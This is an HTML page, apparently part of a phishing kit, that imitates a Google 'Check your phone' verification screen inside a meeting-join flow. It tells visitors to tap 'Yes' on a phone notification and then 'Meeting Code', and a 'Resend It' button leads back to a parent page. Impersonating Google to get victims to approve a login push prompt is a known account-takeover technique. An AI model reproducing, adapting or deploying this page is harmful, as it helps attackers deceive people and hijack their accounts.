<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="logo.png" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    body {
      background-color: #ffffff;
      color: #202124;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding: 30px 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      text-align: left;
      background: transparent;
      box-shadow: none;
      padding: 0;
    }

    /* Main Title */
    h1 {
      font-size: 28px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 20px;
      letter-spacing: -0.4px;
      width: 100%;
      text-align: left;
    }

    /* Phone Graphic Illustration - Extra Large and Right Aligned */
    .phone-illustration-wrapper {
      width: 100%;
      display: flex;
      justify-content: flex-end; /* Right side alignment */
      margin-bottom: 30px;
    }

    .phone-illustration {
      width: 320px; /* Highly enlarged size */
      max-width: 100%;
      height: auto;
      object-fit: contain;
    }

    /* Sub Heading */
    h2 {
      font-size: 26px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 14px;
      letter-spacing: -0.3px;
      width: 100%;
      text-align: left;
    }

    /* Description Text */
    .desc-text {
      font-size: 16px;
      color: #3c4043;
      line-height: 1.55;
      margin-bottom: 24px;
      text-align: left;
      width: 100%;
    }

    .desc-text span {
      font-weight: bold;
      color: #111111;
    }

    /* Try Again / Checkbox Option */
    .try-again-container {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      gap: 12px;
      margin-bottom: 30px;
      font-size: 15px;
      color: #202124;
      cursor: pointer;
      font-weight: 400;
    }

    .try-again-container input[type="checkbox"] {
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #0e71eb;
      border: 1.5px solid #70757a;
      border-radius: 2px;
    }

    /* Resend Button */
    .btn-join {
      background-color: #0e71eb;
      color: white;
      padding: 14px 0;
      width: 100%;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      box-shadow: 0 2px 6px rgba(14, 113, 235, 0.25);
      transition: background-color 0.2s;
    }

    .btn-join:hover {
      background-color: #0b5cff;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>One Time Pass Code.</h1>

    <!-- Extra Large Phone Illustration on Right Side -->
    <div class="phone-illustration-wrapper">
      <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
    </div>

    <h2>Check your phone.</h2>

    <p class="desc-text">
      Google sent a notification to your phone.<br>
      <span>Tap Yes</span> on the notification<br>
      Then Tap Meeting Code
    </p>

    <label class="try-again-container">
      <input type="checkbox" id="tryAgainCheck">
      <span>Try again.</span>
    </label>

    <button class="btn-join" onclick="window.location.href='../'">Resend It</button>
  </div>

</body>
</html>
